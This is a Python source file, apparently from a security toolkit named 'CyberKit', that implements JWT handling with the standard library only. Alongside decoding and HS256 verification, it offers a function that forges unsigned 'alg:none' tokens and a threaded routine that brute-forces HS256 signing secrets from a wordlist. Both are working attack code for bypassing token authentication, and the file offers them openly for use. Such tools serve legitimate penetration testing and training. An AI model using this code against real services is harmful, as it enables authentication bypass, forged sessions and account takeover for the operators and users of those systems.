"""
CyberKit — JWT Forge & Verify Engine

Decode, forge, and brute-force JSON Web Tokens using stdlib only.
No PyJWT dependency.
"""

import base64
import hashlib
import hmac
import json
import threading
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Optional


@dataclass
class JwtParts:
    header_b64:   str
    payload_b64:  str
    signature_b64: str
    header:       dict[str, Any]
    payload:      dict[str, Any]


@dataclass
class BruteResult:
    found:     bool
    secret:    str = ""
    attempts:  int = 0
    elapsed_s: float = 0.0


# ── helpers ───────────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    """Decode a base64url segment (with or without padding)."""
    pad = (4 - len(s) % 4) % 4
    return base64.urlsafe_b64decode(s + "=" * pad)


def _b64url_encode(b: bytes) -> str:
    """Encode bytes to base64url without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


# ── public API ────────────────────────────────────────────────────────────────

def decode(token: str) -> JwtParts:
    """
    Parse a JWT string into its three segments and decode header/payload.
    Raises ValueError with a descriptive message on any failure.
    """
    token = token.strip()
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(
            f"JWT must have exactly 3 segments separated by '.', got {len(parts)}"
        )
    header_b64, payload_b64, sig_b64 = parts
    try:
        header_bytes = _b64url_decode(header_b64)
    except Exception as exc:
        raise ValueError(f"Header is not valid base64url: {exc}") from exc
    try:
        header = json.loads(header_bytes)
    except json.JSONDecodeError as exc:
        raise ValueError(f"Header is not valid JSON: {exc}") from exc
    try:
        payload_bytes = _b64url_decode(payload_b64)
    except Exception as exc:
        raise ValueError(f"Payload is not valid base64url: {exc}") from exc
    try:
        payload = json.loads(payload_bytes)
    except json.JSONDecodeError as exc:
        raise ValueError(f"Payload is not valid JSON: {exc}") from exc

    return JwtParts(
        header_b64=header_b64,
        payload_b64=payload_b64,
        signature_b64=sig_b64,
        header=header,
        payload=payload,
    )


def forge_none_alg(token: str) -> str:
    """
    Forge a token with alg:none.
    Returns <new_header>.<original_payload>. (empty signature).
    """
    parts = decode(token)
    new_header = dict(parts.header)
    new_header["alg"] = "none"
    new_header_b64 = _b64url_encode(
        json.dumps(new_header, separators=(",", ":")).encode("utf-8")
    )
    return f"{new_header_b64}.{parts.payload_b64}."


def verify_hs256(token: str, secret: str) -> bool:
    """
    Return True if the token's signature validates against the given secret.
    Returns False on any error (malformed token, wrong algorithm, wrong secret).
    """
    try:
        parts = decode(token)
    except ValueError:
        return False
    signing_input = f"{parts.header_b64}.{parts.payload_b64}".encode("utf-8")
    expected = hmac.new(
        secret.encode("utf-8"), signing_input, hashlib.sha256
    ).digest()
    try:
        actual = _b64url_decode(parts.signature_b64)
    except Exception:
        return False
    return hmac.compare_digest(expected, actual)


def brute_force(
    token: str,
    wordlist_path: str,
    stop_event: threading.Event,
    on_try: Callable[[BruteResult], None],
) -> BruteResult:
    """
    Try each line of wordlist_path as an HS256 signing secret.
    Calls on_try every 500 attempts and on success.
    Respects stop_event between lines.
    Returns BruteResult with found=True/False.
    """
    start = time.monotonic()
    attempts = 0

    if stop_event.is_set():
        return BruteResult(found=False, attempts=0, elapsed_s=0.0)

    try:
        f = open(wordlist_path, "r", encoding="utf-8", errors="replace")
    except OSError as exc:
        on_try(BruteResult(found=False, attempts=0, elapsed_s=0.0))
        return BruteResult(found=False, attempts=0, elapsed_s=0.0)

    with f:
        for line in f:
            if stop_event.is_set():
                break
            candidate = line.rstrip("\r\n")
            attempts += 1
            if verify_hs256(token, candidate):
                result = BruteResult(
                    found=True,
                    secret=candidate,
                    attempts=attempts,
                    elapsed_s=time.monotonic() - start,
                )
                on_try(result)
                return result
            if attempts % 500 == 0:
                on_try(BruteResult(
                    found=False,
                    secret=candidate,
                    attempts=attempts,
                    elapsed_s=time.monotonic() - start,
                ))

    return BruteResult(
        found=False,
        attempts=attempts,
        elapsed_s=time.monotonic() - start,
    )
